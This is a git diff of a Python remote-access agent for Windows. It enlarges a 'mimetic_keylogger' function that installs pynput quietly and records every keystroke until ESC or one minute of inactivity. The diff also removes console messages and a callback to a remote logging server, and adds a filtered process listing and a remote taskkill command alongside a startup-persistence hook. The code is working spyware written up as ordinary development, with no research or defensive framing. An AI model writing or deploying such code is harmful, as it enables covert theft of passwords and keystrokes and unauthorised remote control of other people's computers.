@@ -260,12 +260,11 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input using pynput (proven working)."""
+    """Capture keyboard input indefinitely until ESC or 1 minute inactivity."""
     try:
         from pynput.keyboard import Listener
     except ImportError:
         try:
-            print("[mimetic] Installing pynput module...", flush=True)
             subprocess.run(
                 [sys.executable, "-m", "pip", "install", "pynput", "-q"],
                 capture_output=True,
@@ -276,55 +275,86 @@ def mimetic_keylogger():
         except Exception as e:
             return f"Error: Could not install pynput - {str(e)}"
 
-    try:
-        log = []
+    log = []
+    stop_event = threading.Event()
+    last_key_time = time.time()
+    inactivity_timeout = 60  # 1 minute
 
-        def on_press(key):
-            try:
-                # Try to get character
-                if hasattr(key, 'char') and key.char:
-                    log.append(key.char)
+    def on_press(key):
+        nonlocal last_key_time
+        try:
+            # Update last key time
+            last_key_time = time.time()
+
+            # Get character representation
+            if hasattr(key, 'char') and key.char:
+                log.append(key.char)
+            else:
+                # Map special keys
+                key_str = str(key).replace("Key.", "").upper()
+                if key_str == "SPACE":
+                    log.append('[SPACE]')
+                elif key_str == "ENTER":
+                    log.append('[ENTER]')
+                elif key_str == "TAB":
+                    log.append('[TAB]')
+                elif key_str == "BACKSPACE":
+                    log.append('[BACKSPACE]')
+                elif key_str == "DELETE":
+                    log.append('[DELETE]')
+                elif key_str == "ESC":
+                    stop_event.set()
+                    return False  # Stop listening
                 else:
-                    # Map special keys
-                    key_str = str(key).replace("Key.", "").upper()
-                    if key_str == "SPACE":
-                        log.append('[SPACE]')
-                    elif key_str == "ENTER":
-                        log.append('[ENTER]')
-                    elif key_str == "TAB":
-                        log.append('[TAB]')
-                    elif key_str == "BACKSPACE":
-                        log.append('[BACKSPACE]')
-                    elif key_str == "DELETE":
-                        log.append('[DELETE]')
-                    elif key_str == "ESC":
-                        return False  # Stop listening
-                    else:
-                        log.append(f'[{key_str}]')
+                    log.append(f'[{key_str}]')
+        except:
+            pass
+        return None
+
+    listener_obj = None
+    try:
+        # Create and start listener
+        listener_obj = Listener(on_press=on_press)
+        listener_obj.start()
+
+        # Wait until ESC pressed or 1 minute inactivity
+        while True:
+            # Check if ESC was pressed (returns immediately if set)
+            if stop_event.is_set():
+                break
+
+            # Check inactivity timeout
+            elapsed_inactive = time.time() - last_key_time
+            if elapsed_inactive >= inactivity_timeout:
+                break
+
+            # Sleep briefly to avoid busy-waiting
+            time.sleep(0.1)
+
+        # Stop the listener gracefully
+        if listener_obj:
+            try:
+                listener_obj.stop()
             except:
                 pass
 
-        # Listen for keyboard input with 3-second timeout
-        with Listener(on_press=on_press) as listener_obj:
-            listener_obj.join(timeout=3)
+        # Wait for listener thread to finish
+        time.sleep(0.2)
 
         result = ''.join(log)
         return result if result else "No keys recorded"
+
     except Exception as e:
         return f"Error: {str(e)}"
     finally:
-        # Disable mimetic mode (return to normal polling)
-        if device_id:
-            try:
-                req = urllib.request.Request(
-                    LOG_AUTH_URL + f"/mimetic-mode?deviceId={device_id}&enabled=false",
-                    headers={"Authorization": "Bearer " + AGENT_TOKEN, "User-Agent": USER_AGENT},
-                    method="POST",
-                )
-                urllib.request.urlopen(req, timeout=5)
-                print("[mimetic] Fast polling disabled", flush=True)
-            except Exception as e:
-                print(f"[mimetic] Could not disable fast polling: {str(e)}", flush=True)
+        # Ensure listener is stopped
+        try:
+            if listener_obj:
+                if hasattr(listener_obj, 'is_alive') and listener_obj.is_alive():
+                    listener_obj.stop()
+                    time.sleep(0.1)
+        except:
+            pass
 
 
 def restart_agent():
@@ -902,16 +932,16 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle processes command - show only interesting/user processes
+        # Handle processes command - show main process per application
         if cmd_lower == "processes":
             try:
-                result = subprocess.run(["tasklist", "/v"], capture_output=True, text=True, timeout=10)
+                result = subprocess.run(["tasklist", "/v", "/fo", "csv"], capture_output=True, text=True, timeout=10)
                 lines = result.stdout.strip().split("\n")
 
                 # System processes to ignore
                 system_processes = {
                     'svchost', 'csrss', 'lsass', 'services', 'system', 'registry', 'smss',
-                    'wininit', 'winlogon', 'dwm', 'fontdrvhost', 'idle', 'winlogon', 'explorer',
+                    'wininit', 'winlogon', 'dwm', 'fontdrvhost', 'idle', 'explorer',
                     'conhost', 'spoolsv', 'rundll32', 'taskhostw', 'dllhost', 'igfxcuiservice',
                     'intelcpheciservice', 'intelcphdcpsvc', 'logonui', 'userinit', 'memory compression'
                 }
@@ -932,35 +962,78 @@ def execute_shell_command(cmd_str):
                     'windows agent service', 'telelluc'
                 }
 
-                filtered_lines = [lines[0]]  # Header
-                filtered_lines.append(lines[1] if len(lines) > 1 else "")  # Separator
+                import csv
+                from io import StringIO
 
-                for line in lines[2:]:
-                    line_lower = line.lower()
+                processes_by_app = {}
 
-                    # Skip empty lines
-                    if not line.strip():
-                        continue
+                # Parse CSV output
+                try:
+                    csv_reader = csv.DictReader(StringIO(result.stdout))
+                    for row in csv_reader:
+                        if not row or not row.get('Name'):
+                            continue
 
-                    # Check if process is in system ignore list
-                    is_system = any(proc in line_lower for proc in system_processes)
+                        proc_name = row.get('Name', '').lower()
+                        proc_pid = row.get('PID', '0')
+                        mem_str = row.get('Mem Usage', '0').replace(',', '').replace('K', '').strip()
 
-                    # Check if process is interesting
-                    is_interesting = any(keyword in line_lower for keyword in interesting_keywords)
+                        try:
+                            mem_mb = int(mem_str) / 1024 if mem_str.isdigit() else 0
+                        except:
+                            mem_mb = 0
 
-                    # Include if interesting and not system
-                    if is_interesting and not is_system:
-                        filtered_lines.append(line)
+                        # Check if process is interesting and not system
+                        is_system = any(proc in proc_name for proc in system_processes)
+                        is_interesting = any(keyword in proc_name for keyword in interesting_keywords)
 
-                if len(filtered_lines) <= 2:
+                        if is_interesting and not is_system:
+                            app_key = row.get('Name', 'unknown').lower()
+
+                            # Keep only the process with most memory for each app
+                            if app_key not in processes_by_app:
+                                processes_by_app[app_key] = {
+                                    'name': row.get('Name', 'unknown'),
+                                    'pid': proc_pid,
+                                    'mem_mb': mem_mb,
+                                    'count': 1,
+                                    'original': row
+                                }
+                            else:
+                                processes_by_app[app_key]['count'] += 1
+                                if mem_mb > processes_by_app[app_key]['mem_mb']:
+                                    processes_by_app[app_key].update({
+                                        'pid': proc_pid,
+                                        'mem_mb': mem_mb,
+                                        'original': row
+                                    })
+                except:
+                    pass
+
+                if not processes_by_app:
                     return "No interesting processes running"
 
-                # Format output nicely
-                output = "\n".join(filtered_lines[:50])
-                if len(filtered_lines) > 50:
-                    output += f"\n... and {len(filtered_lines) - 50} more processes"
+                # Sort by memory usage (descending)
+                sorted_procs = sorted(processes_by_app.values(), key=lambda x: x['mem_mb'], reverse=True)
 
-                return output
+                # Format output: show main process with PID and count of related processes
+                output_lines = ["Image Name                  PID        Memory        Count"]
+                output_lines.append("=" * 70)
+
+                for proc in sorted_procs[:30]:
+                    name = proc['name']
+                    pid = proc['pid']
+                    mem_mb = proc['mem_mb']
+                    count = proc['count']
+
+                    count_str = f"({count})" if count > 1 else ""
+                    mem_str = f"{mem_mb:.1f}MB"
+
+                    # Format line: name | PID | memory | count
+                    line = f"{name:<30} {pid:<10} {mem_str:<13} {count_str}"
+                    output_lines.append(line)
+
+                return "\n".join(output_lines)
             except Exception as e:
                 return f"Error: {str(e)}"
 
@@ -969,6 +1042,29 @@ def execute_shell_command(cmd_str):
             try:
                 result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=10)
                 return result.stdout.strip() if result.stdout else "Unable to retrieve network config"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle taskkill command
+        if cmd_lower.startswith("taskkill "):
+            try:
+                parts = cmd_str.split()
+                if len(parts) < 3:
+                    return "Usage: taskkill <id> <pid>"
+                pid = parts[2]
+                if not pid.isdigit():
+                    return f"Error: Invalid PID '{pid}'"
+                result = subprocess.run(
+                    ["taskkill", "/PID", pid, "/F"],
+                    capture_output=True,
+                    text=True,
+                    timeout=10
+                )
+                if result.returncode == 0:
+                    return f"Process {pid} terminated successfully"
+                else:
+                    error_msg = result.stderr.strip() if result.stderr else "Unknown error"
+                    return f"Error terminating process {pid}: {error_msg}"
             except Exception as e:
                 return f"Error: {str(e)}"
 
